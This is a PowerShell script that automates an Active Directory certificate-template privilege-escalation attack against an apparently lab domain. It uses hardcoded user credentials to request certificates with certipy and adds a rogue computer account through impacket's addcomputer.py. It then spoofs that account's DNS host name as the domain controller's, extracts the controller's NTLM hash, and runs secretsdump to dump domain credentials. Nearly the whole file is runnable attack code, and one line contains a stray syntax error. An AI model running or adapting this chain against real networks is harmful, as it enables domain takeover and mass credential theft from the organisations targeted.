# Display the contents of an ASCII text file
Get-Content ascii.txt

try {
    # Attempt to run certipy and capture the output
    $output = certipy --version 2>&1
    Write-Host "Certipy is installed. Version info: $output"
} catch {
    # If certipy is not found, catch the error and provide feedback
    if ($_.Exception.Message -like "*certipy is not recognized*") {
        Write-Host "Certipy is not installed, attempting installation..."

        try {
            # Use python -m pip to install certipy
            & python -m pip install certipy
            Write-Host "Certipy has been successfully installed."
        } catch {
            Write-Host "Error installing Certipy: $($_.Exception.Message)"
        }
    } else {
        Write-Host "An error occurred: $($_.Exception.Message)"
    }
}

# Check if the eanderson.pfx file exists in the current directory
if (Test-Path -Path ".\eanderson.pfx") {
    Write-Host "`nCertificate request successful. eanderson.pfx found in the directory."
    Write-Host "Generated a certificate for our low-privileged AD user`n"
} else {
    $certipyCommand = "certipy req -u EAnderson@Activedirectoryenvironment.local -p Employee23213 -ca ActiveDirectoryEnvironment-AD-DOMAIN-CONTR-CA -template User -debug"
    
    try {
        # Attempt to run the certipy command and capture the output
        $output = Invoke-Expression -Command $certipyCommand 2>&1
        Write-Host "`nCertificate request successful. Output: $output"
    } catch {
        Write-Host "`nAn error occurred while executing the certipy command: $($_.Exception.Message)"
    }
}

# Define the regex pattern for NTLM hashes
$ntlmHashPattern = "[a-fA-F0-9]{32}:[a-fA-F0-9]{32}"

# Attempt to authenticate using the certipy auth command with the specified PFX file
try {
    $authCommand = "certipy auth -pfx .\eanderson.pfx"
    $authOutput = Invoke-Expression -Command $authCommand 2>&1

    # Display the initial output of the auth command
    Write-Host "Initial auth command output: $authOutput"

    # Check if the output matches the NTLM hash pattern
    if ($authOutput -match $ntlmHashPattern) {
        Write-Host "Authentication successful and NTLM hash pattern found in output."
    } else {
        Write-Host "NTLM hash pattern not found in initial output, attempting to rerun the auth command..."

        # Rerun the authentication command
        $authOutputRetry = Invoke-Expression -Command $authCommand 2>&1

        # Display the output of the rerun auth command
        Write-Host "Rerun auth command output: $authOutputRetry"

        if ($authOutputRetry -match $ntlmHashPattern) {
            Write-Host "Authentication successful after retry and NTLM hash pattern found in output."
        } else {y
            Write-Host "NTLM hash pattern still not found after retry, please check the issue manually."
        }
    }
} catch {
    Write-Host "An error occurred during authentication: $($_.Exception.Message)"
}

try {
    # Specify the URL of the file to download
    $url = "https://raw.githubusercontent.com/fortra/impacket/master/examples/addcomputer.py"

    # Specify the path where the file will be saved
    # Ensure the path exists or change it to a suitable location
    $outputPath = ".\addcomputer.py"

    # Use Invoke-WebRequest to download the file
    Invoke-WebRequest -Uri $url -OutFile $outputPath

    # Output success message with the download location
    Write-Host "File downloaded successfully to $outputPath"
} catch {
    # If an error occurs, catch it and display an error message
    Write-Host "An error occurred while downloading the file: $($_.Exception.Message)"
}

try {
    # Define the command to execute
    $pythonCommand = "python .\addcomputer.py 'activedirectoryenvironment.local/EAnderson:Employee23213' -method LDAPS -computer-name 'Demo1' -computer-pass 'Simplepassword'"
    
    # Execute the Python command
    $output = Invoke-Expression -Command $pythonCommand
    
    # Output the result of the command
    Write-Output "Command executed successfully: $output"
} catch {
    # Error handling
    Write-Output "An error occurred: $($_.Exception.Message)"
}

try {
    # Construct the Certipy command with your parameters
    $certipyCommand = "certipy req -u Demo1$@Activedirectoryenvironment.local -p Simplepassword -ca ActiveDirectoryEnvironment-AD-DOMAIN-CONTR-CA -template Machine"

    # Execute the Certipy command
    $output = Invoke-Expression -Command $certipyCommand 2>&1

    # Output the result of the command
    Write-Host "Certipy command executed successfully. Output: $output"
} catch {
    # If an error occurs, catch it and output the error message
    Write-Host "An error occurred while executing the Certipy command: $($_.Exception.Message)"
}

# Define the regex pattern for NTLM hashes
$ntlmHashPattern = "[a-fA-F0-9]{32}:[a-fA-F0-9]{32}"

# Attempt to authenticate using the certipy auth command with the specified PFX file
try {
    $authCommand = "certipy auth -pfx Demo1.pfx"
    $authOutput = Invoke-Expression -Command $authCommand 2>&1

    # Display the initial output of the auth command
    Write-Host "Initial auth command output: $authOutput"

    # Check if the output matches the NTLM hash pattern
    if ($authOutput -match $ntlmHashPattern) {
        Write-Host "Authentication successful and NTLM hash pattern found in output."
    } else {
        Write-Host "NTLM hash pattern not found in initial output."
    }
} catch {
    Write-Host "An error occurred during authentication: $($_.Exception.Message)"
}

# Ensure the Active Directory module is loaded
if (-not(Get-Module -Name ActiveDirectory)) {
    Import-Module ActiveDirectory
}

# Retrieve and display DNSHostName and ServicePrincipalName for Demo1
Write-Host "Before modification:"
try {
    $computer = Get-ADComputer Demo1 -Properties DNSHostName,ServicePrincipalName
    Write-Host "DNSHostName: $($computer.DNSHostName)"
    Write-Host "ServicePrincipalName: $($computer.ServicePrincipalName)"
} catch {
    Write-Host "Error retrieving computer 'Demo1': $($_.Exception.Message)"
}

# Clear the ServicePrincipalName for Demo1
try {
    Set-ADComputer Demo1 -ServicePrincipalName @{}
    Write-Host "ServicePrincipalName has been cleared for Demo1."
} catch {
    Write-Host "Error clearing ServicePrincipalName for 'Demo1': $($_.Exception.Message)"
}

try{
    Set-ADComputer Demo1 -DnsHostName "AD-DOMAIN-CONTR.ActiveDirectoryEnvironment.local"
    Write-Host "Changing dns host name."
} catch {
    Write-Host "Error changing the dns host name: $($_.Exception.Message)"
}

# Retrieve and display DNSHostName and ServicePrincipalName again to confirm the changes
Write-Host "After modification:"
try {
    $computer = Get-ADComputer Demo1 -Properties DNSHostName,ServicePrincipalName
    Write-Host "DNSHostName: $($computer.DNSHostName)"
    # If the ServicePrincipalName is cleared, it might not display anything
    Write-Host "ServicePrincipalName: $($computer.ServicePrincipalName)"
} catch {
    Write-Host "Error retrieving computer 'Demo1' after modification: $($_.Exception.Message)"
}

# Execute the Certipy req command to request a certificate

try {
    # Define the Certipy req command with all necessary parameters
    $certipyCommand = "certipy req -u Demo1$@Activedirectoryenvironment.local -p Simplepassword -ca ActiveDirectoryEnvironment-AD-DOMAIN-CONTR-CA -template Machine"
    
    # Execute the command and capture the output
    $output = Invoke-Expression -Command $certipyCommand 2>&1
    
    # Display the command output
    Write-Host "Certipy req command executed successfully. Output:"
    Write-Host $output
} catch {
    # Catch and display any errors that occur during execution
    Write-Host "An error occurred during the certificate request:"
    Write-Host $_.Exception.Message
}

# Execute the Certipy authentication command using a PFX file

try {
    # Define the Certipy auth command with the PFX file
    $certipyCommand = "certipy auth -pfx .\ad-domain-contr.pfx"
    
    # Execute the command and capture the output
    $output = Invoke-Expression -Command $certipyCommand 2>&1
    
    # Define the NTLM hash pattern
    $ntlmHashPattern = "[a-fA-F0-9]{32}:[a-fA-F0-9]{32}"
    
    # Extract and print the NTLM hash
    $matches = [regex]::Matches($output, $ntlmHashPattern)
    if ($matches.Count -gt 0) {
        foreach ($match in $matches) {
            Write-Output "Extracted NTLM Hash: $($match.Value)"
            $hash = $match.Value
            #Write-Host $hash
            
            # Use the found NTLM hash in the impacket-secretsdump command
            $secretsDumpCommand = "secretsdump.py 'activedirectoryenvironment.local/ad-domain-contr$@activedirectoryenvironment.local' -dc-ip 192.168.15.144 -hashes `"$hash`""
            
            # Execute the secretsdump command and capture the output
            $secretsDumpOutput = Invoke-Expression -Command $secretsDumpCommand
            
            # Splitting the output into lines for better readability
            $secretsDumpOutputLines = $secretsDumpOutput -split "`n"
            
            Write-Host "Impacket-secretsdump command executed successfully. Output:`n"
            
            foreach ($line in $secretsDumpOutputLines) {
                if (-not [string]::IsNullOrWhiteSpace($line)) {
                    Write-Host $line
                }
            }
        }
    } else {
        Write-Host "`nNo NTLM hash found in the output.`n"
    }
} catch {
    Write-Host "`nAn error occurred during execution:`n"
    Write-Host $_.Exception.Message
}






